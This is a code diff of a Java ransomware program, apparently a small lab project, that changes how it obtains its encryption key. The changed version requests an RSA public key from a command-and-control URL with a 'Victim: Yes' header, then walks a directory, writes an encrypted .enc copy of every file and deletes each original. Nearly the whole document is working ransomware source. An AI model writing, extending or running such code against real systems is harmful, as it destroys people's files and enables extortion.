@@ -1,16 +1,19 @@
+import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.security.KeyPair;
-import java.security.KeyPairGenerator;
+import java.security.KeyFactory;
 import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.X509EncodedKeySpec;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.List;
@@ -19,17 +22,6 @@ import javax.crypto.Cipher;
 
 class secret {
 	private String req_url="http://127.0.0.1/recv.php";
-	KeyPair secret(){
-		KeyPairGenerator kpg = null;
-		try{
-			kpg = KeyPairGenerator.getInstance("RSA");
-		} catch (NoSuchAlgorithmException e) {
-			throw new RuntimeException(e);
-		}
-		kpg.initialize(2048);
-		KeyPair kp = kpg.generateKeyPair();
-		return kp;
-	}
 	void encryptFiles(int cipherMode,PublicKey pKey,String inputFile,String outputFile) throws Exception{
 			Cipher cipher = Cipher.getInstance("RSA");
 			cipher.init(Cipher.ENCRYPT_MODE,pKey);
@@ -40,14 +32,14 @@ class secret {
 			writer.write(Base64.getEncoder().encodeToString(cipherText));
 			writer.close();
     }
-    void initiaiteConnection() throws IOException{
-        sendPOST();
+    PublicKey initiaiteConnection() throws IOException{
+        return sendPOST();
     }
 
-    private void sendPOST() throws IOException{
+    private PublicKey sendPOST() throws IOException{
         URL obj = new URL(req_url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
-        con.setRequestMethod("POST");
+        con.setRequestMethod("GET");
         con.addRequestProperty("Victim", "Yes");
 		int maxTries = 3;
 		while(maxTries != 0){
@@ -62,14 +54,33 @@ class secret {
 			System.out.println("Not Reachable!");
 			System.exit(0);
 		}
+		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+		String inputLine;
+		StringBuffer response = new StringBuffer();
+		while((inputLine = in.readLine()) != null){
+			response.append(inputLine);
+		}
+		in.close();
+		String tmp = response.toString();
+		String pubKey = tmp.replaceAll("-","").replaceAll("BEGIN PUBLIC KEY","").replaceAll("END PUBLIC KEY","");
+		//System.out.println(pubKey);
+		byte[] publickBytes = Base64.getDecoder().decode(pubKey);
+		X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publickBytes);
+		try{
+			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+			PublicKey publicKey = keyFactory.generatePublic(keySpec);
+			return publicKey;
+		}
+		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
+			throw new RuntimeException(e);
+		}
+		//publickKey final in PublicKey publicKey 
     }
 }
 
 class RansomwareActivate{
-	void encryptAllFiles() throws IOException{
+	void encryptAllFiles(PublicKey pubKey) throws IOException{
 		secret sec = new secret();
-		sec.initiaiteConnection();
-		KeyPair kp = sec.secret();
 		List<Path> fileNames = new ArrayList<Path>();
 		try{
 			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
@@ -81,7 +92,7 @@ class RansomwareActivate{
 		for(Path file:fileNames){
 			try{
 				System.out.println("Encrypting file: "+file.toString());
-				sec.encryptFiles(Cipher.ENCRYPT_MODE, kp.getPublic(), file.toString(),file.toString()+".enc");
+				sec.encryptFiles(Cipher.ENCRYPT_MODE, pubKey, file.toString(),file.toString()+".enc");
 				File f = new File(file.toString());
 				f.delete();
 			}
@@ -93,12 +104,13 @@ class RansomwareActivate{
 }
 
 class encrypt {
-	void activate() throws IOException{
+	static void activate(PublicKey pubKey) throws IOException{
 		RansomwareActivate ransomware  = new RansomwareActivate();
-		ransomware.encryptAllFiles();
+		ransomware.encryptAllFiles(pubKey);
 	}
 	public static void main(String[] args) throws IOException{
 		secret sec = new secret();
-		sec.initiaiteConnection();
+		PublicKey pubKey =  sec.initiaiteConnection();
+		activate(pubKey);
 	}
 }
